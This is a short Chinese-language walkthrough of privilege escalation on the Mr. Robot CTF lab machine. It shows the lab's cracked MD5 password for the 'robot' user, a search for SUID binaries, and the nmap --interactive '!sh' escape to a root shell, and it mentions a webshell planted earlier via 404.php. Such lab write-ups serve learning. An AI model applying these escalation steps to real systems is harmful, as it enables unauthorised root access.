---
categories:
- training
tags: 
    - training
---

<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mr.robot（SUID）提权</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">mr.robot（SUID）提权</h1>
        <div class="show-content">
          <p>前景提要：上次通过爆破后台，修改404.php获得一个webshell。现在学习提权。</p><p>id、whoami、hostname</p><blockquote><p>信息：daemon用户，uid=1说明是系统用户，主机名linux</p></blockquote><p>cd home/robot</p><blockquote>
<p>信息：获得另一个key（2/3），和passwd文件，文件内容：</p>
<p>robot:c3fcd3d76192e4007dfb496cca67e13b</p>
</blockquote><p>MD5解码：abcdefghijklmnopqrstuvwxyz</p><p>(⊙﹏⊙)这个明显是偏CTF，而不是模拟真实渗透环境啊。</p><p>su robot/abcdefghijklmnopqrstuvwxyz</p><hr><p>寻找有<a href="https://www.jianshu.com/p/45e60bed314e" target="_blank">SUID权限</a>的文件。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-e3705143f79975d2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>于是通过nmap提权。</p><p>查看nmap版本：/usr/local/bin/nmap --version   或者 nmap -V</p><p>老版本的nmap(2.02-5.21)有一个交互模式，使得用户可以执行shell。</p><blockquote>
<p>nmap --interactive</p>
<p>!sh</p>
<p>pwd</p>
<p>cd root</p>
<p>ls</p>
</blockquote><p>获得第三个key.</p>
        </div>
      </div>
    </div>
  </body>
</html>
